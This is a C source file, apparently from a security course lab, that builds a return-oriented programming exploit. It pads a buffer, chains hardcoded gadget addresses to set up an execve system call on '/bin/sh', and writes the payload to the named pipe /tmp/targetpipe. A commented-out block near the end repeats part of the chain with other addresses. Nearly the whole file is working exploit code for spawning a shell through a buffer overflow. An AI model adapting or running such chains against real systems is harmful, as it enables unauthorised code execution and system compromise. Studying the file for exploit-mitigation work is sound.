#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

#define PIPEPATH "/tmp/targetpipe"

int main(void)
{
  char bufr[204];
  // bufr address = bfbf671d
  char null_arg_addr[] = "\xdc\x67\xbf\xbf"; // bufr + 191
  char y_addr[] = "\xe0\x67\xbf\xbf"; // bufr + 195
  char null_arg_addr2[] = "\xe4\x67\xbf\xbf"; // bufr + 199
  char x_addr[] = "\xe8\x67\xbf\xbf"; // bufr + 203

  char trap[] = "\xe5\xb6\xa9\xbb";

  char xor_eax[] = "\xc2\xb3\xa9\xbb";
  char xor_edx[] = "\xd4\xbe\xb3\xbb";

  char pop_eax[] = "\xe1\xa0\xb9\xbb";
  char pop_edx[] = "\x1b\xdc\xb9\xbb";
  char pop_ecx[] = "\x22\xa4\xba\xbb";

  char add_dl_al[] = "\x07\x46\xbb\xbb";
  
  char write_at_ecx_from_edx[] = "\x7e\xb8\xb6\xbb"; 

  char exec_arg[] = "\x3b\x01\x01\x01";

  int i;
  // Fill up buffer
  for(i = 0; i < 131; i++)
    memcpy(bufr + i, "\x01",1);

  // overwrite ebp
  // pop arg into edx
  strcpy(bufr + 131, pop_edx); // 0xbbb9dc1b
  strcpy(bufr + 135, exec_arg);
  // clear eax
  strcpy(bufr + 139, xor_eax); // 0xbba9b3c2
  // add last 8 bits of edx to eax
  strcpy(bufr + 143, add_dl_al); // 0xbbbb4607
                                 // eax now holds 0x3b (59)
  // clear edx 
  strcpy(bufr + 147, xor_edx); // 0xbbb3bed4
  // pop null args address into ecx
  strcpy(bufr + 151, pop_ecx); // 0xbbbaa422
  strcpy(bufr + 155, null_arg_addr); // = 0xbfbf67d0
  // write 4 bytes of null to address in ecx
  strcpy(bufr + 159, write_at_ecx_from_edx); // 0xbbb6b87e
                                             // null arg 1 should be present
  strcpy(bufr + 163, pop_ecx); // 0xbbbaa422           
  strcpy(bufr + 167, null_arg_addr2); // = 0xbfbf68a4        
  // write 4 bytes of null to address in ecx
  strcpy(bufr + 171, write_at_ecx_from_edx); // 0xbbb6b87e

  // trap into kernel
  strcpy(bufr + 175, trap); // 0xbba9b6e5
  // leave 4 bytes for the ret call of trap
  strcpy(bufr + 179, "\x01\x01\x01\x01");
  // address of "/bin/sh"
  strcpy(bufr + 183, x_addr);
  // address of y
  strcpy(bufr + 187, y_addr);
  // leave 4 bytes for null arg at bufr + 179
  strcpy(bufr + 191, "\x01\x01\x01\x01");
  // start of y
  strcpy(bufr + 195, x_addr);
  // second null arg
  strcpy(bufr + 199, "\x01\x01\x01\x01");
  // location of "/bin/sh"
  strcpy(bufr + 203, "/bin/sh\x00");

  writecmd(PIPEPATH, bufr);
  
  return 0;
}
// esp: 0xbfbf57d8 -> 08048be8
// buf: 0xbfbf57e5

/*
  // overwrite ebp
  // pop arg into edx
  strcpy(bufr + 131, pop_edx); // 0xbbb9dc1b
  strcpy(bufr + 135, exec_arg);
  // clear eax
  strcpy(bufr + 139, xor_eax); // 0xbba9b3c2
  // add last 8 bits of edx to eax
  strcpy(bufr + 143, add_dl_al); // 0xbbbb4607
                                 // eax now holds 0x3b (59)
  // clear edx 
  strcpy(bufr + 147, xor_edx); // 0xbbb3bed4
  // pop null args address into ecx
  strcpy(bufr + 151, pop_ecx); // 0xbbbaa422
  strcpy(bufr + 155, null_arg_addr); // = 0xbfbf588c
  // write 4 bytes of null to address in ecx
  strcpy(bufr + 159, write_at_ecx_from_edx); // 0xbbb6b87e
                                             // null arg should be present
  */